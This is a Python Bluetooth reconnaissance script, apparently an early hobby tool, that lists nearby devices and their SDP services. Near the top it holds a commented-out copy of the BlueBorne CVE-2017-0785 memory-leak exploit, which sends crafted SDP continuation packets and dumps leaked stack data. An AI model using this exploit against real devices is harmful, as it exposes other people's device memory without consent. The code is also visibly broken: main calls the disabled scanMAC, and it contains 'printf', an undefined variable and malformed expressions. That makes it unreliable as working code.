#! /usr/bin/env python3
import pwn
import socket
import argparse
import bluetooth

# #Testing blueborne code from https://github.com/ojasookert/CVE-2017-0785/blob/master/CVE-2017-0785.py
# def scanMAC(macAddr):
#
#     sock=bluetooth.BluetoothSocket(bluetooth.L2CAP)
#
#     bd_addr = macAddr
#     port = 0x1001
#
#     sock.connect((bd_addr, port))
#
#     sock.send("hello!!")
#
#     sock.close()
#     # service_long = 0x0100
#     # service_short = 0x0001
#     # mtu = 50
#     # n = 30
#     #
#     # def packet(service, continuation_state):
#     #     pkt = '\x02\x00\x00'
#     #     pkt += str(pwn.p16(7 + len(continuation_state)))
#     #     pkt += '\x35\x03\x19'
#     #     pkt += str(pwn.p16(service))
#     #     pkt += '\x01\x00'
#     #     pkt += continuation_state
#     #     return pkt
#     #
#     # p = pwn.log.progress('Exploit')
#     # p.status('Creating L2CAP socket')
#     #
#     # sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
#     # bluetooth.set_l2cap_mtu(sock, mtu)
#     # pwn.context.endian = 'big'
#     #
#     # p.status('Connecting to target')
#     # sock.connect((macAddr, 1))
#     #
#     # p.status('Sending packet 0')
#     # sock.send(packet(service_long, '\x00'))
#     # data = sock.recv(mtu)
#     #
#     # if data[-3] != '\x02':
#     #     pwn.log.error('Invalid continuation state received.')
#     #
#     # stack = ''
#     #
#     # for i in range(1, n):
#     #     p.status('Sending packet %d' % i)
#     #     sock.send(packet(service_short, data[-3:]))
#     #     data = sock.recv(mtu)
#     #     stack += data[9:-3]
#     #
#     # sock.close()
#     #
#     # p.success('Done')
#     #
#     # print(hexdump(stack))

#Scans all nearby bluetooth devices, return list of MACS and Device Names(if available). Devices must be in discoverable mode. Does not work with low power Bluetooth
def scanAll():
    #Standard ble check
    nearby_devices = bluetooth.discover_devices(lookup_names=True)

    print(f'found {len(nearby_devices)}')

    for addr, name in nearby_devices:
        print(f'{addr}  -   {name}')

#Scan all available Bluetooth connections for all available services
def scanAllServices():
    results = bluetooth.find_service(name = None, uuid = None, address = None)

    host = "Host"
    name = "Name"
    description = "Description"
    provider = "Provider"
    protocol = "Protocol"
    port = "Port"
    service_classes = "Service Classes"
    profiles = "Profiles"
    print(f"|{host:^20}|{name:^25}|{description:^20}|{provider:^20}|{protocol:^20}|{port:^20}")
    for match in results:
        host = "None" if match["host"] is None else match["host"]
        name = "None" if match["name"] is None else match["name"]
        description = "None" if match["description"] is None else match["description"]
        provider = "None" if match["provider"] is None else match["provider"]
        protocol = "None" if match["protocol"] is None else match["protocol"]
        port = "None" if match["port"] is None else match["port"]
        service_classes = "None" if match["service-classes"] is None else match["service-classes"]
        profiles = "None" if match["profiles"] is None else match["profiles"]
        print(f"|{host:^20}|{name:^25}|{description:^20}|{provider:^20}|{protocol:^20}|{port:^20}")

#Scan services of all available bluetooth devices in range based on uuid value. Second arg for one device only
def scanUUIDServices(uuidVal, addr = None):
    service_matches = bluetooth.find_service(uuid = uuidVal, bdaddr = addr)

    if len(service_matches == 0):
        printf(f'No services matching {uuidVal} found.')
    else:
        host = "Host"
        name = "Name"
        protocol = "Protocol"
        port = "Port"
        print(f"|{host:^20}|{name:^25}|{protocol:^20}|{port:^20}|")
        for match in service_matches:
            host = "None" if match["host"] is None else match["host"]
            name = "None" if match["name"] is None else match["name"]
            protocol = "None" if match["protocol"] is None else match["protocol"]
            port = "None" if match["port"] is None else match["port"]
            print(f"|{host:^20}|{name:^25}|{protocol:^20}|{port:^20}|")

#Scan services of all available bluetooth devices in range based on name. Second arg for one device only
def scanNameServices(nameVal, addr = None):
    service_matches = bluetooth.find_service(name = nameVal, bdaddr = addr)

    if len(service_matches == 0):
        printf(f'No services matching {uuidVal} found.')
    else:
        host = "Host"
        name = "Name"
        protocol = "Protocol"
        port = "Port"
        print(f"|{host:^20}|{name:^25}|{protocol:^20}|{port:^20}|")
        for match in service_matches:
            host = "None" if match["host"] is None else match["host"]
            name = "None" if match["name"] is None else match["name"]
            protocol = "None" if match["protocol"] is None else match["protocol"]
            port = "None" if match["port"] is none else None["port"]
            print(f"|{host:^20}|{name:^25}|{protocol:^20}|{port:^20}|")

#Verifies if input is a UUID of style 'XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX'
def isUUID(input):
    if input.count("-")!=4:
        return False
    if len(input) !=36:
        return False
    for section in input.split("-"):
        for char in section:
            if (char>"F" or (char<"A" and not char.isdigit())) or (char >= "a" and char <= "z"):
                return False
    return True

#Verifies if input is a MAC address of style 'XX:XX:XX:XX:XX:XX'
def isMACAddress(input):
    if input.count(":")!=5:
        return False
    for section in input.split(":"):
        for char in section:
            if char>"F" or (char<"A" and not char.isdigit()) or len(section)!=2:
                return False
    return True

#Parse arguments, verify valid format
def parseArgs():
    parser = argparse.ArgumentParser(description='Scan given MAC address for Bluetooth vulnerabilites, or scan for all bluetooth devices in range and in discovery mode.')
    parser.add_argument('MAC', nargs='?', help='MAC Address of Bluetooth device to scan for vulnerabilites')

    args = parser.parse_args();
    if args.MAC is not None:
        if isMACAddress(args.MAC):
            return args.MAC
        else:
            print("Usage: BlueberryPi_v0.1 [XX:XX:XX:XX:XX:XX]")
            exit(1)
    else:
        return None

#Main section
def main():

    #Parse arguments
    input = parseArgs();

    #Stuff
    if(input is not None):
        scanMAC(input)
    else:
        scanAll()
        scanAllServices()



if __name__ == '__main__':
    main()
